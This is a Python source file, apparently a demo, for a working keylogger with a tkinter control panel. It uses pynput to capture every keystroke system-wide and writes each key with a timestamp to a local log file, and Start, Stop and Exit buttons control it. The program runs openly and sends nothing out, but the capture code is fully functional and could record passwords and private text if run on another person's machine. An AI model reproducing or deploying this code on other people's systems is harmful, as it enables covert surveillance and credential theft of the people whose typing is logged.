import tkinter as tk
from threading import Thread
from pynput.keyboard import Listener, Key
from datetime import datetime

log_file = "key_logs.txt"
listener = None
running = False      

def write_log(text):
    with open(log_file, "a") as file:
        file.write(text)

def on_press(key):
    if not running:
        return False
    
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        write_log(f"[{time}] {key.char}\n")
    except AttributeError:
        if key == Key.space:
            write_log(f"[{time}] [SPACE]\n")
        elif key == Key.enter:
            write_log(f"[{time}] [ENTER]\n")
        else:
            write_log(f"[{time}] [SPECIAL] {key}\n")

def keylogger_thread():
    global listener
    listener = Listener(on_press=on_press)
    listener.start()
    listener.join()

def start_keylogger():
    global running
    running = True
    status_label.config(text="Status: RUNNING", fg="green")
    Thread(target=keylogger_thread, daemon=True).start()

def stop_keylogger():
    global running, listener
    running = False
    status_label.config(text="Status: STOPPED", fg="red")
    write_log("\n--- Keylogger stopped by GUI ---\n")
    try:
        listener.stop()
    except:
        pass

def exit_app():
    stop_keylogger()
    root.destroy()

# ---------------- GUI ---------------------
root = tk.Tk()
root.title("Cybersecurity Keylogger Demo")
root.geometry("350x220")
root.resizable(False, False)

title_label = tk.Label(root, text="Keylogger Control Panel", font=("Arial", 14, "bold"))
title_label.pack(pady=10)

status_label = tk.Label(root, text="Status: STOPPED", font=("Arial", 12), fg="red")
status_label.pack(pady=10)

start_btn = tk.Button(root, text="Start Keylogger", font=("Arial", 12),
                      bg="#4CAF50", fg="white", width=20, command=start_keylogger)
start_btn.pack(pady=5)

stop_btn = tk.Button(root, text="Stop Keylogger", font=("Arial", 12),
                     bg="#F44336", fg="white", width=20, command=stop_keylogger)
stop_btn.pack(pady=5)

exit_btn = tk.Button(root, text="Exit", font=("Arial", 12),
                     bg="gray", fg="white", width=20, command=exit_app)
exit_btn.pack(pady=10)

root.mainloop()
